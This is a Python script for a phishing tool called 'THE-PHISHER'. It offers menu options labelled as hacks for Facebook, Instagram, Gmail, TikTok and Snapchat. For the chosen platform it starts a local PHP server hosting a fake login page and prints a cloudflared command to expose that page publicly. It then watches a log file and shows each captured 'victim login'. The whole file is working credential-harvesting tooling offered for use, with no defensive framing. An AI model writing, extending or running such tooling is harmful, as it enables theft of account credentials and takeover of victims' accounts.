import os
import time
from colorama import Fore, Style, init

init(autoreset=True)

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(Fore.GREEN
+Style.BRIGHT + """╝
 



$$$$$$$$\ $$\   $$\ $$$$$$$$\      $$$$$$$\  $$\   $$\ $$$$$$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\        
\__$$  __|$$ |  $$ |$$  _____|     $$  __$$\ $$ |  $$ |\_$$  _|$$  __$$\ $$ |  $$ |$$  _____|$$  __$$\       
   $$ |   $$ |  $$ |$$ |           $$ |  $$ |$$ |  $$ |  $$ |  $$ /  \__|$$ |  $$ |$$ |      $$ |  $$ |      
   $$ |   $$$$$$$$ |$$$$$\ $$$$$$\ $$$$$$$  |$$$$$$$$ |  $$ |  \$$$$$$\  $$$$$$$$ |$$$$$\    $$$$$$$  |      
   $$ |   $$  __$$ |$$  __|\______|$$  ____/ $$  __$$ |  $$ |   \____$$\ $$  __$$ |$$  __|   $$  __$$<       
   $$ |   $$ |  $$ |$$ |           $$ |      $$ |  $$ |  $$ |  $$\   $$ |$$ |  $$ |$$ |      $$ |  $$ |      
   $$ |   $$ |  $$ |$$$$$$$$\      $$ |      $$ |  $$ |$$$$$$\ \$$$$$$  |$$ |  $$ |$$$$$$$$\ $$ |  $$ |      
   \__|   \__|  \__|\________|     \__|      \__|  \__|\______| \______/ \__|  \__|\________|\__|  \__|      
                                                                                                                       """ + Fore.YELLOW + "  👻 Tool: " + Fore.CYAN + "THE-PHISHER" + Fore.RED + " | HCO @the_silent_hacker_raj\n")

def menu():
    print(Fore.MAGENTA + Style.BRIGHT + """
 [1] 🔵FACEBOOK HACK 
 
 [2] 🔵INSTAGRAM HACK
 
 [3] 🔵GMAIL HACK 
 
 [4] 🔵TIK TOK HACK 
 
 [5] 🔵SNAPCHAT HACK 
 
 [0] Exit❌❌
""")
    choice = input(Fore.YELLOW + "Select Option: ")
    if choice == "1":
        start_phish("facebook")
    elif choice == "2":
        start_phish("instagram")
    elif choice == "3":
        start_phish("gmail")
    elif choice == "4":
        start_phish("tiktok")
    elif choice == "5":
        start_phish("snapchat")
    elif choice == "0":
        print(Fore.RED + "[!] Exiting...")
        exit()
    else:
        print(Fore.RED + "[!] Invalid option!")

def start_phish(site):
    os.system("pkill php")
    print(Fore.GREEN + f"[*] Launching phishing site for {site.capitalize()}...")

    # Start PHP server
    os.system(f"php -S 127.0.0.1:8080 -t sites/{site} > /dev/null 2>&1 &")
    print(Fore.GREEN + f"[✔] Local PHP server started at http://127.0.0.1:8080")

    # Show Cloudflared run command
    print(Fore.CYAN + f"\n🚀 Now in a NEW session, run the following Cloudflared command:\n")
    print("👉  " + Fore.GREEN + Style.BRIGHT + "cloudflared tunnel --url http://127.0.0.1:8080\n")

    # Log watching
    print(Fore.YELLOW + f"📡 Waiting for victim login... (Log file: sites/{site}/log.txt)\n")
    log_file = f"sites/{site}/log.txt"

    try:
        with open(log_file, 'r') as file:
            lines = file.readlines()
    except:
        lines = []

    while True:
        try:
            with open(log_file, 'r') as file:
                new_lines = file.readlines()
            if len(new_lines) > len(lines):
                for line in new_lines[len(lines):]:
                    print(Fore.RED + "🕵️‍♀️ New Login: " + Fore.WHITE + line.strip())
                lines = new_lines
            time.sleep(1)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Exiting monitoring...")
            break

# Run tool
if __name__ == "__main__":
    banner()
    menu()
